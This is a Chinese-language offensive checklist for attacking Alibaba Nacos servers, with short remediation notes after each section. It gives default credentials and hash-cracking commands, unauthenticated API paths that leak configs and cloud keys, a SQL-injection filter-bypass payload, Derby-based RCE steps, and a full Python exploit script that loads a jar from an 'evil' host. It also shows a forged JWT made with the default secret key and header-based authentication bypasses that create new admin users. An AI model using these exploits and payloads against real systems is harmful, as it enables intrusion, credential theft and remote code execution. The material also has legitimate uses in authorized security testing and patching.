# Nacos 漏洞 Checklist

## 一、前置知识

### 0x01 Nacos 概述

Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。

## 二、默认口令/弱口令

Nacos 默认帐户名密码：

```
nacos/nacos
```

数据库中的 bcrypt 加密存储示例：

```shell
# nacos
$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu

# Hello123
$2a$10$rT.ZmZTjj55Xs65yR9ZDdexuLITXfCXkifQv4KpLm7yVLtiBmUHgG
```

弱口令爆破 with hashcat：

```shell
# nacos
echo -n '$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu' > hashes.txt
-----
hashcat -m 3200 -a 0 -o result.txt hashes.txt ~/HackTools/Dict/YOUR_DICT.txt --force
-----
cat result.txt
$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu:nacos

# Hello123
echo -n '$2a$10$rT.ZmZTjj55Xs65yR9ZDdexuLITXfCXkifQv4KpLm7yVLtiBmUHgG' > hashes.txt
hashcat -m 3200 -a 0 -o result.txt hashes.txt ~/HackTools/Dict/YOUR_DICT.txt --force
-----
cat result.txt
$2a$10$rT.ZmZTjj55Xs65yR9ZDdexuLITXfCXkifQv4KpLm7yVLtiBmUHgG:Hello123
```

弱口令爆破 with john the ripper：

```shell
john --wordlist=~/HackTools/Dict/YOUR_DICT.txt hashes.txt
-----
john --show hashes.txt
?:Hello123
```

## 三、可能存在的未授权 API

### 0x01 用户信息 API

```
/nacos/v1/auth/users?pageNo=1&pageSize=9
```

### 0x02 集群信息 API

```
/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=
```

### 0x03 配置信息 API

```
/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=9&tenant=&search=accurate&accessToken=&username=

# or
/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=9&tenant=<IF_YOU_KNOW_SOME_TENANT>&search=accurate&accessToken=&username=
```

这一接口在未授权的情况下可能会暴露 Spring、MySQL、Redis、Druid 等配置信息，若存在云环境、文件系统，还可能暴露 accessKey、secretKey 等。

获取配置信息示例：

![image-20230609161347780](images/image-20230609161347780.png)

获取 ak、sk 示例：

![image-20230609161814152](images/image-20230609161814152.png)

如果返回为 403 Forbidden，可以尝试 CNVD-2023674205 漏洞绕过限制。

## 四、 SQL 注入风险 CVE-2021-29442

### 漏洞描述

在使用 Derby 数据库作为内置数据源时，Nacos config server 中有未鉴权接口 `/nacos/v1/cs/ops/derby`，执行 SQL 语句可以查看敏感数据，可以执行任意的 SELECT 查询语句。如果使用外置数据库（如 MySQL），则该接口无法访问。

漏洞点位于 nacos-config 的 com.alibaba.nacos.config.server.controller.ConfigOpsController。

### 漏洞影响

```
Nacos 未鉴权且使用 Derby 数据库作为内置数据源
```

### 漏洞复现

poc：

```
/nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables

# or
/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
```

一些查询语句：

```
select * from users
select * from permissions
select * from roles
select * from tenant_info
select * from tenant_capacity
select * from group_capacity
select * from config_tags_relation
select * from app_configdata_relation_pubs
select * from app_configdata_relation_subs
select * from app_list
select * from config_info_aggr
select * from config_info_tag
select * from config_info_beta
select * from his_config_info
select * from config_info
```

Bypass payload：

```
/nacos/v1/cs/ops/derby?sql=SELECT--/dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad&sql=/%0a*--/%25&q=dssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssaddssad%&sql=%0afrom--/&sql=/%0ausers
```

使用 Derby 数据库作为内置数据源，且目标系统未开启鉴权功能时，可调用该接口实现 RCE。[RCE payload](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce):

1. 创建一个 java 编译并打包成 jar，放置在对应站点下，如：

```
import java.io.IOException;

public class testShell4 {
    public static void exec() throws IOException {
        Runtime.getRuntime().exec("cmd.exe /c calc");
    }
}
```

2. sql 语句部分如下：

```
# 导入一个类到数据库中
CALL SQLJ.INSTALL_JAR('http://127.0.0.1:8088/test.jar', 'APP.Sample4', 0)

# 将这个类加入到derby.database.classpath，这个属性是动态的，不需要重启数据库
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','APP.Sample4')

# 创建一个PROCEDURE，EXTERNAL NAME 后面的值可以调用类的static类型方法
CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'testShell4.exec'

# 调用PROCEDURE
CALL SALES.TOTAL_REVENUES()
```

另一个 [Exploit](https://github.com/vulhub/vulhub/tree/master/nacos/CVE-2021-29442):

```
package test.poc;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.StringWriter;

public class Example {
  public static void main(String[] args) {
    String ret = exec("ipconfig");
    System.out.println(ret);
  }
  
  public static String exec(String cmd) {
    StringBuffer bf = new StringBuffer();
    try {
      String charset = "utf-8";
      String osName = System.getProperty("os.name");
      if (osName != null && osName.startsWith("Windows"))
        charset = "gbk"; 
      Process p = Runtime.getRuntime().exec(cmd);
      InputStream fis = p.getInputStream();
      InputStreamReader isr = new InputStreamReader(fis, charset);
      BufferedReader br = new BufferedReader(isr);
      String line = null;
      while ((line = br.readLine()) != null)
        bf.append(line); 
    } catch (Exception e) {
      StringWriter writer = new StringWriter();
      PrintWriter printer = new PrintWriter(writer);
      e.printStackTrace(printer);
      try {
        writer.close();
        printer.close();
      } catch (IOException iOException) {}
      return "ERROR:" + writer.toString();
    } 
    return bf.toString();
  }
}
```

```
import random
import sys
import requests
from urllib.parse import urljoin
import argparse


def exploit(target, command, service):  
    removal_url = urljoin(target, '/nacos/v1/cs/ops/data/removal')
    derby_url = urljoin(target, '/nacos/v1/cs/ops/derby')
    for i in range(0, sys.maxsize):
        id = ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', 8))
        post_sql = f"""CALL sqlj.install_jar('{service}', 'NACOS.{id}', 0)
CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'NACOS.{id}')
CREATE FUNCTION S_EXAMPLE_{id}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
"""
        get_sql = f"select * from (select count(*) as b, S_EXAMPLE_{id}('{command}') as a from config_info) tmp"
        files = {'file': post_sql}
        post_resp = requests.post(url=removal_url, files=files)
        post_json = post_resp.json()
        if post_json.get('message', None) is None and post_json.get('data', None) is not None:
            print(post_resp.text)
            get_resp = requests.get(url=derby_url, params={'sql': get_sql})
            print(get_resp.text)
            break


def main():
    parser = argparse.ArgumentParser(description='Exploit script for Nacos CVE-2021-29442')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    parser.add_argument('-s', '--service', required=True, help='Service URL')
    
    args = parser.parse_args()
    
    exploit(args.target, args.command, args.service)

if __name__ == '__main__':
    main()
```

```
python poc.py -t http://your-ip:8848 -s http://evil/Nacos.jar -c "ps aux"  
```

### 修复建议

- [关于Nacos Derby数据库运维接口/nacos/v1/cs/ops/derby相关问题公告](https://nacos-group.github.io/blog/announcement-derby-ops-api/?source=news/)

## 五、认证绕过/用户创建 CVE-2021-29441

### 漏洞描述

2020 年 12 月 29 日披露。在 Nacos 进行认证授权操作时，会判断请求的 User-Agent 是否为 ”Nacos-Server”，如果是的话则不进行任何认证。该配置为硬编码，通过该漏洞，攻击者可以获取到用户名密码等敏感信息，且可以进行任意操作，包括创建新用户并进行登录后操作。

### 漏洞影响

```
Nacos <= 2.0.0-ALPHA.1
```

### 漏洞复现

访问 `/nacos/v1/auth/users?pageNo=1&pageSize=9` ，查看状态码是否为 200，且内容中是否包含 `pageItems`。通过该路由可查询 IP 地址、Nacos 端口、Nacos 版本、raftPort 等信息：

```
http://your-ip:port/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=
```

通过 `/nacos/v1/auth/users` 路由查询已有的用户列表及敏感信息：

```
http://your-ip:port/nacos/v1/auth/users?pageNo=1&pageSize=9
```

![image-20230609142007526](images/image-20230609142007526.png)

此处需要注意，大部分企业的 Nacos 的 URL 为 `/v1/auth/users` ，而不是默认的 `/nacos/v1/auth/users`，即：

```
/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=
```

```
/v1/auth/users?pageNo=1&pageSize=9
```

尝试以 POST 方式创建新用户（whoami/whoami）：

```
POST /v1/auth/users HTTP/1.1

username=whoami&password=whoami
```

![image-20230609143031183](images/image-20230609143031183.png)

查看刚才创建的新用户，使用添加的新用户（whoami/whoami）进行登录：

```
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
```

![image-20230609143105272](images/image-20230609143105272.png)

HTTP Request Headers：

```
User-Agent: Nacos-Server
```

### 修复建议

1. 修改 Nacos 的 application.properties 配置文件，开启服务身份识别功能，配置后访问 `/nacos/v1/auth/users/?pageNo=1&pageSize=9` 路由将返回 403 Forbidden。

```
# 开启鉴权
nacos.core.auth.enabled=true
nacos.core.auth.enable.userAgentAuthWhite=false
nacos.core.auth.server.identity.key=YOUR-KEY
nacos.core.auth.server.identity.value=YOUR-VALUE
```

2. Nacos 注册及配置中心开启权限认证，编辑项目中的 bootstrap.yml 或 bootstrap.properties，修改 discovery 和 config 开启用户密码认证（用户名和密码不能带有 %、$ 等会被转义的特殊字符）。

## 六、secret.key 默认密钥 CNVD-2023674205

### 漏洞描述

2023 年 3 月 2 日披露。Alibaba Nacos 使用了固定的 secret.key 默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞。

### 漏洞影响

```
Alibaba Nacos <= 2.2.0
```

### 漏洞复现

在配置文件 conf/application.properties 中，默认硬编码 nacos.core.auth.plugin.nacos.token.secret.key 的值。

```
nacos.core.auth.plugin.nacos.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
```

Nacos 使用 jwt token，算法为 HS256，将 secret.key 的默认值当作 secretKey，生成 Signature。jwt token 的 Payload 为 subject（用户名）和 exp（有效期）。

我们伪造一个 jwt token，Payload：

```
{
  "sub": "nacos",
  "exp": 1696669333
}
```

![image-20230609155053114](images/image-20230609155053114.png)

伪造的 jwt token：

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5OTg4ODc3N30.bYEColBVGkF-H-kGr9PxWnbmZZp66z77NXUNHXZbbnw
```

进行验证，没有配置 jwt token 时，返回 403 Forbidden：

```
GET /v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=9&tenant=&search=accurate&accessToken=&username= HTTP/1.1
Host: your-ip
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5OTg4ODc3N30.bYEColBVGkF-H-kGr9PxWnbmZZp66z77NXUNHXZbbnw
```

![image-20230609155124566](images/image-20230609155124566.png)

修改 Authorization 头，配置 jwt token，返回 200 OK：

```
Authorization: Bearer <jwt token>
```

![image-20230609155215648](images/image-20230609155215648.png)

### 漏洞修复

1. 修改生成 Token 的 secret.key，推荐自定义密钥时，将配置项设置为 Base64 编码的字符串，且原始密钥长度不得低于 32 字符。

```
#启用认证
nacos.core.auth.enabled=true
#生成 Token 的密钥
nacos.core.auth.plugin.nacos.token.secret.key=base64编码
```

2. 升级到 2.2.0.1 及之后版本。Nacos 官方在 2023.03.02 发布了 2.2.0.1，下载地址：https://github.com/alibaba/nacos/releases/tag/2.2.0.1，最新版本：https://github.com/alibaba/nacos/releases。

## 七、identity.key/value 默认值认证绕过

### 漏洞描述

当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，配置文件中存在默认值：

```
nacos.core.auth.server.identity.key=serverIdentity
nacos.core.auth.server.identity.value=security
```

该硬编码导致攻击者可以构造携带该 key 和 value 的请求，从而绕过权限认证。

### 漏洞影响

```
Nacos <= 2.2.0
```

### 漏洞复现

```
POST /v1/auth/users HTTP/1.1
serverIdentity: security

username=whoami&password=whoami
```

当开启 Nacos 权限认证（nacos.core.auth.enabled=true）后，必须填写 nacos.core.auth.server.identity.key 和 nacos.core.auth.server.identity.value 才能够正常启动。若 `serverIdentity: security` 无法绕过，可以尝试以下键值对：

```
官网示例中的键值对 example:example
```

```
搜索引擎解决方案中出现最多的键值对 test:test
```

### 漏洞修复

1. 配置自定义身份识别的 key（不可为空）和 value（不可为空）：

```
nacos.core.auth.server.identity.key=example
nacos.core.auth.server.identity.value=example
```

2. 升级最新版本：https://github.com/alibaba/nacos/releases。

## 八、Nacos 集群 Raft 反序列化漏洞

### 漏洞描述

Nacos 在处理某些基于 Jraft 的请求时，采用 Hessian 进行反序列化，但并未设置限制，导致应用存在远程代码执行（RCE）漏洞。

### 漏洞影响

```
1.4.0 <= Nacos < 1.4.6  使用cluster集群模式运行
2.0.0 <= Nacos < 2.2.3  任意模式启动
```

Nacos 1.x 在单机模式下默认不开放 7848 端口，故该情况通常不受此漏洞影响。Nacos 2.x 版本无论单机或集群模式均默认开放 7848 端口。

### 漏洞复现

exp：

- https://github.com/c0olw/NacosRce/

### 漏洞修复

#### 通用修补建议

目前官方已发布安全修复更新，受影响用户可以升级到 Nacos 1.4.6、Nacos 2.2.3：

- https://github.com/alibaba/nacos/releases/tag/1.4.6
- https://github.com/alibaba/nacos/releases/tag/2.2.3

#### 临时修补建议

对外限制开放 7848 端口，一般使用时该端口为 Nacos 集群间 Raft 协议的通信端口，不承载客户端请求，因此老版本可以通过禁止该端口来自 Nacos 集群外的请求达到止血目的（如部署时已进行限制或未暴露，则风险可控）。
